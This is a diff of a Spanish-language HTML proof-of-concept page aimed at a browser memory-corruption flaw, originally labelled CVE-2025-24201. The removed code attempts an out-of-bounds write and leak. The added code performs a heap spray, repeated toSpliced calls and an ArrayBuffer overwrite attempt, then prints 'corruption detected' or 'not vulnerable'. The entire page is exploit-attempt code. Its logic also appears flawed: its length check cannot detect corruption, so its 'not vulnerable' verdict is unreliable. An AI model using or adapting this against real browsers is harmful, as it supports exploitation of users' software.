@@ -1,32 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC Agresivo CVE-2025-24201</title>
+  <title>PoC Agresivo - Heap Abuse</title>
   <script>
-    function trigger() {
-      let oobArray = [1.1, 2.2, 3.3];
-      let corruptArray = [13.37];
-      let victimObj = { marker: 0x41414141 };
+    function hex(n) {
+      return n.toString(16).padStart(16, "0");
+    }
 
-      // Intentar provocar OOB con set length
-      oobArray.length = 0x100;
-      for (let i = 0; i < 100000; i++) {
-        oobArray.push(1.1);
+    function trigger() {
+      // Fase 1: Preparar heap
+      const spray = [];
+      for (let i = 0; i < 1000; i++) {
+        let arr = new Float64Array(100);
+        for (let j = 0; j < 100; j++) arr[j] = 13.37;
+        spray.push(arr);
       }
 
-      try {
-        // Forzar acceso fuera de límites
-        for (let i = 0; i < 10000; i++) {
-          oobArray[i] = 1.1;
-        }
-        oobArray[0x10000] = 13.37; // OOB write
-        corruptArray[0] = victimObj;
+      // Fase 2: Desincronizar estructura con `toSpliced`
+      let arr = [1.1, 2.2, 3.3, 4.4];
+      for (let i = 0; i < 10000; i++) {
+        arr.toSpliced(0, 0, 5.5); // Crea una copia "mutante"
+      }
 
-        // Intento de manipular memoria adyacente
-        let leak = oobArray[0x10000];
-        document.body.innerHTML = `<h1>Leaked: ${leak}</h1>`;
-      } catch (e) {
-        document.body.innerHTML = `<h1>EXCEPTION: ${e.message}</h1>`;
+      // Fase 3: Crear overlap con ArrayBuffer y ver si hay fuga
+      let ab = new ArrayBuffer(0x100);
+      let dv = new DataView(ab);
+      for (let i = 0; i < dv.byteLength; i++) dv.setUint8(i, 0x41);
+
+      // Fase 4: Intentar sobrescribir estructura con spray
+      for (let i = 0; i < spray.length; i++) {
+        spray[i][0] = ab;
+      }
+
+      // Fase 5: Verificación y log
+      let corrupted = false;
+      for (let i = 0; i < spray.length; i++) {
+        if (spray[i].length !== 100) {
+          corrupted = true;
+          break;
+        }
+      }
+
+      if (corrupted) {
+        document.body.innerHTML = `<h1 style="color:red;">🚨 CORRUPCIÓN DETECTADA</h1>`;
+      } else {
+        document.body.innerHTML = `<h1 style="color:green;">Sin corrupción detectable (no vulnerable)</h1>`;
       }
     }
 
@@ -34,6 +52,6 @@
   </script>
 </head>
 <body>
-  <h1>PoC Agresivo ejecutando...</h1>
+  <h1>Ejecutando PoC Agresivo JS...</h1>
 </body>
 </html>
